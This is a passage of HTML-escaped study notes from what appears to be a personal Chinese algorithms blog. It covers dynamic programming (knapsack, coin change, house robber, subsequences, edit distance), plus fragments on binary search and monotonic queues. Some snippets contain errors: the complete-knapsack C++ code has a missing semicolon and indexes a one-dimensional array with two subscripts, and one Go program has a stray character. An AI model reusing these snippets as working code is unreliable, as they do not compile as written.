        for (int i = 0; i &amp;lt; nums.size(); i++) sum += nums[i];
        if (abs(S) &amp;gt; sum) return 0; // 此时没有方案
        if ((S + sum) % 2 == 1) return 0; // 此时没有方案
        int bagSize = (S + sum) / 2;
        vector&amp;lt;int&amp;gt; dp(bagSize + 1, 0);
        dp[0] = 1;
        for (int i = 0; i &amp;lt; nums.size(); i++) {
            for (int j = bagSize; j &amp;gt;= nums[i]; j--) {
                dp[j] += dp[j - nums[i]];
            }
        }
        return dp[bagSize];
    }
};

// 没完全懂
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;完全背包&#34;&gt;完全背包&lt;/h2&gt;
&lt;p&gt;完全背包问题与01背包的问题区别就是每件物品都可以有无限个。&lt;/p&gt;
&lt;p&gt;遍历顺序变一下就好：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;

using namespace std;

const int N = 1005;

int main() {
    int n, v;
    int dp[N];
    int weight[N];
    int value[N];
    memset(dp, 0, sizeof(dp));
    
    scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;v);
    for (int i = 0; i &amp;lt; n; i ++) {
        scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;weight[i], &amp;amp;value[i]);
    }
    
    for (int i = 0; i &amp;lt; n; i++) {
        for (int j = weight[i]; j &amp;lt;= v; j++) { // 这里从小到大
            dp[j] = max(dp[j], dp[j-weight[i]] + value[i])
        }
    }
    cout &amp;lt;&amp;lt; dp[n - 1][v];
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这两层for循环的内外层可以互换，结果没有什么区别。&lt;/p&gt;
&lt;p&gt;但是通常题目都会变一变，比如装满背包可以有几种方法，这时候内外层互换就有区别了。&lt;/p&gt;
&lt;h3 id=&#34;零钱兑换-ii&#34;&gt;零钱兑换 II&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/coin-change-2/&lt;/p&gt;
&lt;p&gt;这是一道多重背包问题、然后转化为组合问题&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func change(amount int, coins []int) int {
    var dp [5005] int
    dp[0] = 1

    for i := 0; i &amp;lt; len(coins); i++ {
        for j := coins[i]; j &amp;lt;= amount; j++ {
            dp[j] += dp[j - coins[i]]
        }
    }
    return dp[amount]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;这道题最后让求组合数，即选择物品是没有顺序的，所以外层必须为遍历物品。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果内层遍历物品，每件物品需要被遍历多次，那么这个时候相当于每次的选择顺序都有了，满足条件的都会被记录下来，比如选1,2和选2,1都会被记录下来，而组合问题中这两种选择是一个答案。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;所以遍历背包放在外层是一个组合问题，放在内层是一个排列问题。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;组合总和iv&#34;&gt;组合总和Ⅳ&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/combination-sum-iv/&lt;/p&gt;
&lt;p&gt;这道题题目说是组合，但根据题目描述，可以看出这是一道排列题，并非我们常规认为的排列，而是需要满足题目要求，同时选择的顺序不同算作是多种答案。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;因此需要将物品的遍历顺序放在内层循环。&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func combinationSum4(nums []int, target int) int {
    var dp [1005] int
    dp[0] = 1
    
    for j := 0; j &amp;lt;= target; j++ {
        for i := 0; i &amp;lt; len(nums); i++ {
            if j &amp;gt;= nums[i] {
                dp[j] += dp[j - nums[i]]
            }
        }
    }
    return dp[target]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;m阶爬楼梯&#34;&gt;m阶爬楼梯&lt;/h3&gt;
&lt;p&gt;这道爬楼梯问题https://leetcode-cn.com/problems/min-cost-climbing-stairs/submissions/限制了每次只能跨1阶或2阶楼梯，那如果改成，每次可以跨1阶、2阶...m阶，可以有多少种爬楼梯的方法。&lt;/p&gt;
&lt;p&gt;其实这就是一道完全背包问题，把1,2,3,4,...,m看成是物品的体积，楼顶就是背包容量，每个物品是可以重复选的，变成了一道考察排列的完全背包问题。同样的，需要把物品遍历放在内层循环。&lt;/p&gt;
&lt;h3 id=&#34;零钱兑换&#34;&gt;零钱兑换&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/coin-change/&lt;/p&gt;
&lt;p&gt;每个物品不限次数，可以看出是完全背包问题，最终求出填满背包，需要最少的物品的数量，如果不能填满，则输出-1。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;定义dp[j]表示填满背包容量为j需要的最少物品数量。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;dp[j]只有一个来源，即dp[j-coins[i]]，dp[j]要取所有dp[j-coins[i]]+1当中最小的，递推公式&lt;code&gt;dp[j] = min(dp[j], dp[j-coins[i]] + 1)&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;初始化：dp[j]要定义为一个最大的数，在这里定义为amount+1就已经够大了。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;遍历顺序：求钱币的最小数目，钱币有无顺序都无所谓。内外层互换也是可以的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func min(x, y int) int {
    if x &amp;lt; y {
        return x
    }
    return y
}

func coinChange(coins []int, amount int) int {
    var dp [10005] int

    for i := 1; i &amp;lt;= amount; i++ {
        dp[i] = amount + 1
    }
    
    for j := 0; j &amp;lt;= amount; j++ {
        for i := 0; i &amp;lt; len(coins) ; i ++ {
            if j &amp;gt;= coins[i] {
                dp[j] = min(dp[j], dp[j - coins[i]] + 1)
            }
        }
    }

    if dp[amount] == amount + 1 {
        return -1
    }
    return dp[amount]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;完全平方数&#34;&gt;完全平方数&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/perfect-squares/&lt;/p&gt;
&lt;p&gt;和零钱兑换是一样的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func min (x, y int) int {
    if x &amp;lt; y {
        return x
    }
    return y
}


func numSquares(n int) int {
    var dp [10005] int

    for i := 1; i &amp;lt;= n; i++ {
        dp[i] = n + 1
    }
    dp[1] = 1
    sqrtn := int(math.Sqrt(float64(n)))
    for i := 1; i &amp;lt; sqrtn + 1; i ++ {
        for j := 1; j &amp;lt;= n; j++ {
            if j &amp;gt;= i * i {
                dp[j] = min(dp[j], dp[j - i * i] + 1)
            }
        }
    }
    return dp[n]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;单词拆分&#34;&gt;单词拆分&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/word-break/&lt;/p&gt;
&lt;p&gt;go的切片操作把我绕晕了，这个就是遍历整个字符串。&lt;/p&gt;
&lt;p&gt;dp[j]：表示前j字符是否可以被拆分成字典里出现过的单词。那么dp[j]可由所有dp[j - wordDict[i]]推得，只要有一个dp[j-wordDict[i]]为true，那么dp[j]就为true。&lt;/p&gt;
&lt;p&gt;另外单词字典遍历必须在内层，因为如果在外层，意思就是选过的单词不能再被选了，是不符合完全背包的。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func wordBreak(s string, wordDict []string) bool {
    var dp [305]bool
    dp[0] = true

    for j := 1;  j&amp;lt;= len(s); j++ {
        for i := 0; i &amp;lt; len(wordDict); i++ {
            if j &amp;gt;= len(wordDict[i]) &amp;amp;&amp;amp; s[j - len(wordDict[i]):j] == wordDict[i] {
                dp[j] = dp[j - len(wordDict[i])] || dp[j]
            }
        }
    }
    return dp[len(s)]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;多重背包&#34;&gt;多重背包&lt;/h2&gt;
&lt;p&gt;多重背包就是每件物品加上了次数的限制，比如每件物品限制的次数也不一定，多重背包问题可以转换成01背包，就是把每件物品拆分开来。&lt;/p&gt;
&lt;h1 id=&#34;打家劫舍&#34;&gt;打家劫舍&lt;/h1&gt;
&lt;h2 id=&#34;打家劫舍-2&#34;&gt;打家劫舍&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/house-robber/&lt;/p&gt;
&lt;p&gt;dp[i]：前i个房间最大的价值&lt;/p&gt;
&lt;p&gt;dp[i]递推公式：对于第i个房间，如果选择偷，那么dp[i] = dp[i-2]+nums[i]，否则dp[i] = dp[i-1]，因此dp[i] = max(dp[i-1],dp[i-2]+nums[i])。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;lt; y {
        return y
    }
    return x
}


func rob(nums []int) int {
    var dp [105] int
    dp[0] = nums[0]
    if len(nums) &amp;gt;= 2 {
        dp[1] = max(nums[0], nums[1])
    }
    for i := 2; i &amp;lt; len(nums); i++ {
        dp[i] = max(dp[i - 1], dp[i - 2] + nums[i])
    }
    return dp[len(nums) - 1]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;打家劫舍-ii&#34;&gt;打家劫舍 II※&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/house-robber-ii/&lt;/p&gt;
&lt;p&gt;这道题是把首尾的房子连成了一个环，因此可以基于两种情况考虑：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;不考虑第一个房子，从第二个开始&lt;/li&gt;
&lt;li&gt;从第一个房子开始，但不考虑最后一个&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max (x, y int) int {
    if (x &amp;gt; y) {
        return x
    }
    return y
}
func rob(nums []int) int {
    if len(nums) == 1 {
        return nums[0]
    }
    var dp1 [105] int
    var dp2 [105] int
    dp1[0] = nums[0]
    dp2[1] = nums[1]
    if len(nums) &amp;gt; 1 {
        dp1[1] = max(nums[0], nums[1])
    }
    if len(nums) &amp;gt; 2 {
        dp2[2] = max(nums[1], nums[2])
    }
    for i := 2; i &amp;lt; len(nums); i++ {
        if i &amp;lt; len(nums) - 1 {
            dp1[i] = max(dp1[i - 1], dp1[i - 2] + nums[i])
        }
        if i &amp;gt; 2 {
            dp2[i] = max(dp2[i - 1], dp2[i - 2] + nums[i])
        }
    }
    return max(dp1[len(nums) - 2], dp2[len(nums) - 1])
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;打家劫舍iii树状dp&#34;&gt;打家劫舍Ⅲ(树状dp)※&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/house-robber-iii/&lt;/p&gt;
&lt;p&gt;对于树状的dp，首先需要遍历整个树，那么需要采用后续遍历，只有获取完子节点的dp数组之后，再决定当前节点的状态。&lt;/p&gt;
&lt;p&gt;对于每个节点有两个状态，就是偷和不偷。如果偷，那么子节点就不可以偷了；如果不偷，那么就可以考虑偷子节点的，注意是考虑，并不是一定要偷，需要取子节点偷和不偷的最大值。&lt;/p&gt;
&lt;p&gt;因此对于每个节点只需要返回两个值dp[2]就可以了，dp[0]表示不偷，dp[1]表示偷&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;不偷当前节点的最大值&lt;/p&gt;
&lt;p&gt;dp[0] = max(left.dp[0], left.dp[1]) + max(right.dp[0], right.dp[1])&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;偷当前节点的最大值&lt;/p&gt;
&lt;p&gt;dp[1] = root.val + left.dp[0] + right.dp[0]&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for a binary tree node.
 * type TreeNode struct {
 *     Val int
 *     Left *TreeNode
 *     Right *TreeNode
 * }
 */

func max (x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

// dp[0] 不偷 dp[1] 偷
func robTree(root *TreeNode) [2]int {
    if root == nil {
        return [2]int{0, 0}
    }
    var left, right, dp [2]int

    left = robTree(root.Left)
    right = robTree(root.Right)

    // 对于当前节点不偷，那么可以考虑偷左右孩子的，注意是考虑，不是一定偷
    dp[0] = max(left[0], left[1]) + max(right[0], right[1])
    // 如果偷，那么左右孩子的就不能偷了
    dp[1] = root.Val + left[0] + right[0]

    return dp
}

func rob(root *TreeNode) int {
    var dp [2]int = robTree(root)
    return max(dp[0], dp[1])
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;没有上司的舞会&#34;&gt;没有上司的舞会&lt;/h2&gt;
&lt;p&gt;https://www.acwing.com/problem/content/287/&lt;/p&gt;
&lt;p&gt;和打家劫舍Ⅲ一样是树状DP，但是这道题是不再是二叉树，而是多叉树，但是方法还是不变，对于一个节点只有偷和不偷两个选择。&lt;/p&gt;
&lt;p&gt;只不过这道题的输入需要自己构建....&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

type treeNode struct {
	Val int
	child []*treeNode
}

func max(x, y int) int {
	if x &amp;gt; y {
		return x
	}
	return y
}

func treeTrace(root *treeNode) [2]int {
	if root == nil {
		return [2]int{0, 0}
	}
	
	var dp [2]int
	for i := 0; i &amp;lt; len(root.child); i++ {
		tmp := treeTrace(root.child[i])
		dp[0] += max(tmp[0], tmp[1])
		dp[1] += tmp[0]
	}
	dp[1] += root.Val

	return dp
}

func main() {
	var n int
	var staffs []treeNode
	var flag [6005] int

	fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;n)

	for i := 0; i &amp;lt; n; i++ {
		var staff treeNode
		fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;staff.Val)
		staffs = append(staffs, staff)
	}

	for i := 0; i &amp;lt; n - 1; i++ {
		var l, k int
		fmt.Scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;l, &amp;amp;k)
		flag[l] = 1
		staffs[k - 1].child = append(staffs[k - 1].child, &amp;amp;staffs[l - 1])
	}

	var root int
	for i := 1; i &amp;lt;= n; i++ {
		if flag[i] == 0 {
			root = i
			break
		}
	}
	var res = treeTrace(&amp;amp;staffs[root - 1])

	fmt.Println(max(res[0], res[1]))

}

&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;子序列问题&#34;&gt;子序列问题&lt;/h1&gt;
&lt;h2 id=&#34;最长递增子序列&#34;&gt;最长递增子序列&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/longest-increasing-subsequence/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func lengthOfLIS(nums []int) int {
    var dp [2505]int
    var res int = 1
    for i := 0; i &amp;lt; len(nums); i++ {
        dp[i] = 1
    }

    for i := 0; i &amp;lt; len(nums); i++ {
        for j := 0; j &amp;lt; i; j++ {
            if nums[i] &amp;gt; nums[j] {
                dp[i] = max(dp[i], dp[j] + 1)
                if res &amp;lt; dp[i] {
                    res = dp[i]
                }
            }
        }
    }

    return res
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;最长连续递增子序列&#34;&gt;最长连续递增子序列&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/longest-continuous-increasing-subsequence/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}


func findLengthOfLCIS(nums []int) int {
    var dp [10005]int
    var res int = 1
    for i := 0; i &amp;lt; len(nums); i++ {
        dp[i] = 1
    }

    for i := 1; i &amp;lt; len(nums); i++ {
        if nums[i] &amp;gt; nums[i - 1] {
            dp[i] = dp[i - 1] + 1
        }
        if res &amp;lt; dp[i] {
            res = dp[i]
        }
    }

    return res
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;最长公共子序列&#34;&gt;最长公共子序列&lt;/h2&gt;
&lt;p&gt;很显然&lt;code&gt;dp[i][j]&lt;/code&gt;的定义为text1的前i个字符和text2的前j个字符的最长公共子序列的字符个数，递推公式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;如果&lt;code&gt;text1[i] == text[j]&lt;/code&gt;：&lt;code&gt;dp[i][j] = dp[i-1][j-1] + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;text1[i] != text[j]&lt;/code&gt;: &lt;code&gt;dp[i][j] = max(dp[i-1][j], dp[i][j-1])&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;https://leetcode-cn.com/problems/longest-common-subsequence/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func longestCommonSubsequence(text1 string, text2 string) int {
    var dp [1005][1005]int

    for i := 0; i &amp;lt; len(text1); i++ {
        for j := 0; j &amp;lt; len(text2); j++ {
            if text1[i] == text2[j] {
                dp[i + 1][j + 1] = dp [i][j] + 1
            } else {
                dp[i + 1][j + 1] = max(dp[i + 1][j], dp[i][j + 1])
            }
        }
    }
    
    return dp[len(text1)][len(text2)]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;最长连续公共子序列&#34;&gt;最长连续公共子序列&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func max(x, y int) int {
    if x &amp;gt; y {
        return x
    }
    return y
}

func findLength(nums1 []int, nums2 []int) int {
    var dp[1005][1005] int
    var res int = 0
    for i := 0; i &amp;lt; len(nums1); i++ {
        for j := 0; j &amp;lt; len(nums2); j++ {
            if nums1[i] == nums2[j] {
                dp[i+1][j+1] = dp[i][j] + 1
            }
            if res &amp;lt; dp[i+1][j+1] {
                res = dp[i+1][j+1]
            }
        }
    }

    return res

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;最短编辑距离&#34;&gt;最短编辑距离&lt;/h2&gt;
&lt;p&gt;https://www.acwing.com/problem/content/904/&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;添加一个字母之后变得相同，说明没有添加前a的前i个已经和b的前j-1个已经相同&lt;br&gt;
即 ： &lt;code&gt;dp[i][j] = dp[i][j-1] + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;删除该字母之后变得相同，说明没有删除前a中前i-1已经和b的前j个已经相同&lt;br&gt;
即 ： &lt;code&gt;dp[i][j] = dp[i-1][j] + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;替换说明对应结尾字母不同，则看倒数第二个&lt;br&gt;
即： &lt;code&gt;dp[i][j] = dp[i-1][j-1] + 1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;两字符相等：&lt;code&gt;dp[i][j] = dp[i-1][j-1]&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

func min(x, y, z int) int {
    if x &amp;lt;= y &amp;amp;&amp;amp; x &amp;lt;= z {
        return x
    } else if y &amp;lt;= x &amp;amp;&amp;amp; y &amp;lt;= z {
        return y
    } else {
        return z
    }
}

func main() {
    var m, n int
    var str1, str2 string
    var dp [1005][1005]int
    
    fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;n)
    fmt.Scanf(&amp;quot;%s&amp;quot;, &amp;amp;str1)
    fmt.Scanf(&amp;quot;%d&amp;quot;, &amp;amp;m)
    fmt.Scanf(&amp;quot;%s&amp;quot;, &amp;amp;str2)

    for i := 1; i &amp;lt;= m; i++ {
        dp[0][i] = i
    }

    for i := 1; i &amp;lt;= n; i++ {
        dp[i][0] = i
    }
    
    for i := 0; i &amp;lt; n; i++ {
        for j := 0; j &amp;lt; m; j++ {
            if str1[i] == str2[j] {
                dp[i + 1][j + 1] = dp[i][j]
            } else {
                dp[i + 1][j + 1] = min(dp[i][j + 1], dp[i + 1][j], dp[i][j]) + 1
            }
        }
    }
    fmt.Println(dp[n][m])
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;编辑距离&#34;&gt;编辑距离&lt;/h2&gt;
&lt;p&gt;https://www.acwing.com/problem/content/901/&lt;/p&gt;
&lt;p&gt;和上题没什么太大差别。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

func min(x, y, z int) int {
	if x &amp;lt;= y &amp;amp;&amp;amp; x &amp;lt;= z {
		return x
	} else if y &amp;lt;= x &amp;amp;&amp;amp; y &amp;lt;= z {
		return y
	} else {
		return z
	}
}

func main() {
	var n, m int
	var str [1005]string

	fmt.Scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;m)

	for i := 0; i &amp;lt; n; i++ {
		fmt.Scanf(&amp;quot;%s&amp;quot;, &amp;amp;str[i])
	}
	for i := 0; i &amp;lt; m; i++ {
		var cnt, cntn int
		var pat string
		fmt.Scanf(&amp;quot;%s %d&amp;quot;, &amp;amp;pat, &amp;amp;cntn)
        
		for j := 0; j &amp;lt; n; j ++ {
			var dp [15][15]int
			for k := 1; k &amp;lt;= 11; k ++ {
				dp[k][0] = k
				dp[0][k] = k
			}
			
			for l := 0; l &amp;lt; len(str[j]); l++ {
				for o := 0; o &amp;lt; len(pat); o++ {
					if str[j][l] == pat[o] {
						dp[l+1][o+1] = dp[l][o]
					} else {
						dp[l+1][o+1] = min(dp[l][o+1], dp[l+1][o], dp[l][o]) + 1
					}
				}z
			}
			if cntn &amp;gt;= dp[len(str[j])][len(pat)] {
				cnt ++
			}
		}
		fmt.Println(cnt)
	}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;回文子串区间dp&#34;&gt;回文子串(区间DP)&lt;/h2&gt;
&lt;p&gt;https://leetcode-cn.com/problems/palindromic-substrings/&lt;/p&gt;
&lt;p&gt;这道题可以定义dp[i]表示前i个字符的回文子串的数目。&lt;br&gt;
那么下来包括判断字串是否是回文一共是三重循环了，能通过。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func palindrome(s string) bool {
    for i := 0; i &amp;lt; len(s); i++ {
        if s[i] != s[len(s) - i - 1] {
            return false
        }
    }
    return true
}

func countSubstrings(s string) int {

    var dp [1005]int

    for i := 1; i &amp;lt;= len(s); i++ {
        var cnt int = 0
        for j := 0; j &amp;lt; i; j++ {
            if palindrome(s[j:i]) {
                cnt ++
            }
        }
        dp[i] = dp[i-1] + cnt
    }

    return dp[len(s)]

}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其实这道题更好的做法是定义&lt;code&gt;dp[i][j]&lt;/code&gt;表示为&lt;code&gt;s[i:j]&lt;/code&gt;是不是回文，因此是一个区间，外层循环是区间的窗口大小，内层是通过滑动窗口。&lt;br&gt;
只有&lt;code&gt;s[i] == s[j] &amp;amp;&amp;amp; (i == 1 || dp[i+1][j-1])&lt;/code&gt;时，&lt;code&gt;dp[i][j] = true&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int countSubstrings(string s) {
        bool dp[1001][1001]={0};
        int res=s.length();
        for(int i=0;i&amp;lt;s.length();i++)
            dp[i][i]=1;        
        for(int i=1;i&amp;lt;=s.length();i++)
        {
            for(int j=0;j+i&amp;lt;s.length();j++)
            {
                if(s[j]==s[j+i] &amp;amp;&amp;amp; (j==j+i || j==i+j-1 || dp[j+1][i+j-1]))
                {
                    // cout&amp;lt;&amp;lt;j&amp;lt;&amp;lt;&amp;quot; &amp;quot;&amp;lt;&amp;lt;i+j&amp;lt;&amp;lt;endl;
                    dp[j][i+j]=1;
                    res++;
                }
            }
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;闫氏dp分析法https://www.cnblogs.com/IzayoiMiku/p/13635809.html&lt;/p&gt;
&lt;/blockquote&gt;
">【算法】动态规划</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/er-fen/"" data-c="
          &lt;h3 id=&#34;整数二分&#34;&gt;整数二分&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;如果单调一定可以二分&lt;/li&gt;
&lt;li&gt;二分不一定必须单调性&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1620963231095.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;二分模板分为两种，在做题的时候，考虑一下&lt;code&gt;check()&lt;/code&gt;条件，如果满足第一种情况需要将&lt;code&gt;mid = (l+r+1)/2&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;例如：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;找到数列&lt;code&gt;1 2 3 3 3 4&lt;/code&gt;中&lt;code&gt;3&lt;/code&gt;的左右区间，显然是&lt;code&gt;[2, 4]&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在二分查找的时候首先查找其左区间，找左区间就是即便&lt;code&gt;x==arr[mid]&lt;/code&gt;，还是要将右指针&lt;code&gt;j&lt;/code&gt;向左挪，而找右区间，即便&lt;code&gt;x==arr[mid]&lt;/code&gt;，左指针&lt;code&gt;i&lt;/code&gt;还是要向右挪。那么代码可以如下：&lt;/p&gt;
&lt;p&gt;找左区间：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;while(i &amp;lt; j) // 左下标
{
    mid = (i+j)/2;
    if(x &amp;gt; arr[mid]) // 如果3&amp;gt;arr[mid]，那么显然mid不再区间[2, 4]内，因此i=mid+1
        i = mid + 1;
    else
        j = mid;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;此时得到的&lt;code&gt;i&lt;/code&gt;则为左区间2。&lt;/p&gt;
&lt;p&gt;找右区间：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;while(i &amp;lt; j)
{
    mid = (i+j+1)/2; //这里的+1是为了防止死循环，例如i=3,j=4，如果不+1，将会死循环
    if(x &amp;gt;= arr[mid]) //如果3&amp;gt;=arr[mid]，显然mid是在区间内的，因此i=mid
        i = mid;
    else
        j = mid - 1;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;二叉搜索树&#34;&gt;二叉搜索树&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/er-wei-shu-zu-zhong-de-cha-zhao-lcof/&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1643609369084.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// 从矩阵的右上角看这是一个二叉搜索树
func findNumberIn2DArray(matrix [][]int, target int) bool {
    if len(matrix) == 0 || len(matrix[0]) == 0 {
        return false
    }
     i, j := 0, len(matrix[0]) - 1
     for i &amp;gt;=0 &amp;amp;&amp;amp; i &amp;lt; len(matrix) &amp;amp;&amp;amp; j &amp;gt;= 0 &amp;amp;&amp;amp; j &amp;lt; len(matrix[0]) {
         if matrix[i][j] &amp;gt; target {
             j --
         } else if matrix[i][j] &amp;lt; target {
             i ++
         } else {
             return true
         }
     }
     return false
}
&lt;/code&gt;&lt;/pre&gt;
">【算法】查找</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/dui-lie-dan-diao-dui-lie/"" data-c="
          &lt;p&gt;单调队列和单调栈有些类似，它们的用途十分有限，但由于算法巧妙优美，所以十分受面试官的青睐。&lt;/p&gt;
&lt;p&gt;单调队列主要用在求滑动区间内最值。&lt;/p&gt;
&lt;p&gt;例题：&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627111710802.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627111714662.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;vector&amp;gt;

using namespace std;

const int N = 1e6 + 10;

int main()
{
    int n, k;
    vector&amp;lt;int&amp;gt; q; // 用一个vector模拟一个队列，队列中存储的是数的下标
    
    scanf(&amp;quot;%d %d&amp;quot;, &amp;amp;n, &amp;amp;k);

    int arr[N];
    
    for(int i = 0; i &amp;lt; n; i++)
    {
        scanf(&amp;quot;%d&amp;quot;, &amp;amp;arr[i]);
    }
    
    
    // 求滑动窗口中的最小值
    for(int i = 0; i &amp;lt; n; i ++ )
    {
        // 如果队列最小值已经不再滑动窗口内，将其删除
        if(!q.empty() &amp;amp;&amp;amp; q.front() &amp;lt; i - k + 1) 
